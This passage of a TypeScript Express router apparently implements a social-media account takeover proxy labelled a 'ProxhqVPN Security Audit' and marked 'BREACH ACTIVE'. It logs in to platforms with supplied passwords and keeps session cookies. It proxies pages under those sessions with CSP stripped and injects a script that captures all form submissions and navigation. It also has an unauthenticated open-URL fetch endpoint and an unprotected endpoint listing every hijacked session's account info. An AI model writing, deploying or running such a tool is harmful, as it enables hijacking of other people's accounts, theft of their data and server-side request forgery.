    window.parent.postMessage({ type: 'social-navigate', url: el.href, sid: SID }, '*');
  }, true);
  // Intercept form submissions
  document.addEventListener('submit', function(e) {
    e.preventDefault(); e.stopPropagation();
    var form = e.target;
    var action = form.action || window.location.href;
    var method = (form.method || 'GET').toUpperCase();
    var params = new URLSearchParams(new FormData(form)).toString();
    var url = method === 'GET' ? action + (action.includes('?') ? '&' : '?') + params : action;
    window.parent.postMessage({ type: 'social-navigate', url: url, sid: SID, method: method, body: params }, '*');
  }, true);
  window.parent.postMessage({ type: 'social-loaded', url: window.location.href, sid: SID }, '*');
  // Override window.location
  try { history.pushState = history.replaceState = function(s,t,u){ if(u){ window.parent.postMessage({type:'social-navigate',url:new URL(u,window.location.href).href,sid:SID},'*'); } }; } catch(e) {}
})();
<\/script>
<div id="__breach_badge__" style="position:fixed;bottom:16px;right:16px;z-index:2147483647;background:#0a0a0f;border:1px solid #ef4444;color:#f87171;font-family:monospace;font-size:11px;padding:8px 14px;border-radius:8px;pointer-events:none;box-shadow:0 0 24px rgba(239,68,68,0.3);line-height:1.4;">
  🔴 BREACH ACTIVE — ${platformName.replace(/</g, "&lt;")}<br>
  <span style="color:#6b7280;font-size:10px;">ProxhqVPN Security Audit</span>
</div>`;

  if (out.includes("</body>")) {
    out = out.replace("</body>", `${interceptScript}</body>`);
  } else {
    out = out + interceptScript;
  }

  return out;
}

// ── Routes ───────────────────────────────────────────────────────────────────

// POST /social-account/login
router.post("/login", async (req: Request, res: Response) => {
  const { platform, username, password, loginUrl } = req.body;
  if (!platform) return res.status(400).json({ error: "platform required" });
  if (!username && !loginUrl) return res.status(400).json({ error: "username required" });
  if (!password) return res.status(400).json({ error: "password required" });

  const result = await dispatchLogin(platform, username || "", password, loginUrl || "");
  return res.json(result);
});

// GET /social-account/navigate — proxy a page with session cookies
router.get("/navigate", async (req: Request, res: Response) => {
  const { sid, url } = req.query as Record<string, string>;
  if (!sid || !url) return res.status(400).json({ error: "sid and url required" });

  const session = sessions.get(sid);
  if (!session) return res.status(404).json({ error: "Session not found or expired" });

  session.lastActive = new Date();
  session.currentUrl = url;

  try {
    const fetchRes = await fetch(url, {
      headers: {
        ...baseH(session.cookies),
        "Referer": session.currentUrl,
      },
      redirect: "follow",
    });

    mergeCookies(session.cookies, parseSetCookies(fetchRes));

    const ct = fetchRes.headers.get("content-type") || "";
    if (ct.includes("text/html")) {
      const html = await fetchRes.text();
      const rewritten = rewriteHtml(html, url, sid, session.platformName);
      res.setHeader("Content-Type", "text/html; charset=utf-8");
      res.setHeader("X-Frame-Options", "SAMEORIGIN");
      res.setHeader("Content-Security-Policy", "");
      return res.send(rewritten);
    } else if (ct.includes("json")) {
      const json = await fetchRes.text();
      return res.setHeader("Content-Type", ct).status(fetchRes.status).send(json);
    } else {
      const buf = await fetchRes.buffer();
      return res.setHeader("Content-Type", ct).send(buf);
    }
  } catch (e: any) {
    return res.status(502).send(`<html><body style="background:#0a0a0f;color:#ef4444;font-family:monospace;padding:2rem"><h2>Proxy Error</h2><p>${e.message}</p></body></html>`);
  }
});

// POST /social-account/navigate — proxy a form POST
router.post("/navigate", async (req: Request, res: Response) => {
  const { sid, url } = req.query as Record<string, string>;
  const session = sessions.get(sid);
  if (!session) return res.status(404).json({ error: "Session not found" });

  session.lastActive = new Date();

  try {
    const body = typeof req.body === "string" ? req.body : new URLSearchParams(req.body).toString();
    const fetchRes = await fetch(url, {
      method: "POST",
      headers: { ...baseH(session.cookies), "Content-Type": "application/x-www-form-urlencoded", "Referer": session.currentUrl },
      body,
      redirect: "follow",
    });

    mergeCookies(session.cookies, parseSetCookies(fetchRes));
    session.currentUrl = fetchRes.url || url;

    const ct = fetchRes.headers.get("content-type") || "";
    if (ct.includes("text/html")) {
      const html = await fetchRes.text();
      const rewritten = rewriteHtml(html, fetchRes.url || url, sid, session.platformName);
      res.setHeader("Content-Type", "text/html; charset=utf-8");
      res.setHeader("X-Frame-Options", "SAMEORIGIN");
      return res.send(rewritten);
    }
    const buf = await fetchRes.buffer();
    return res.setHeader("Content-Type", ct).send(buf);
  } catch (e: any) {
    return res.status(502).json({ error: e.message });
  }
});

// GET /social-account/resource — proxy static resources (no rewriting)
router.get("/resource", async (req: Request, res: Response) => {
  const { url } = req.query as Record<string, string>;
  if (!url) return res.status(400).end();
  try {
    const r = await fetch(url, { headers: { "User-Agent": UA, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9" }, redirect: "follow" });
    const ct = r.headers.get("content-type") || "application/octet-stream";
    const buf = await r.buffer();
    res.setHeader("Content-Type", ct);
    res.setHeader("Cache-Control", "public, max-age=86400");
    res.setHeader("Access-Control-Allow-Origin", "*");
    return res.send(buf);
  } catch { return res.status(502).end(); }
});

// GET /social-account/sessions — list active sessions
router.get("/sessions", (_req: Request, res: Response) => {
  const list = Array.from(sessions.values()).map(s => ({
    id: s.id, platform: s.platform, platformName: s.platformName,
    currentUrl: s.currentUrl, accountInfo: s.accountInfo,
    loginMethod: s.loginMethod, createdAt: s.createdAt, lastActive: s.lastActive,
  }));
  res.json({ sessions: list });
});

// DELETE /social-account/session/:id
router.delete("/session/:id", (req: Request, res: Response) => {
  sessions.delete(String(req.params.id));
  res.json({ ok: true });
});

export default router;
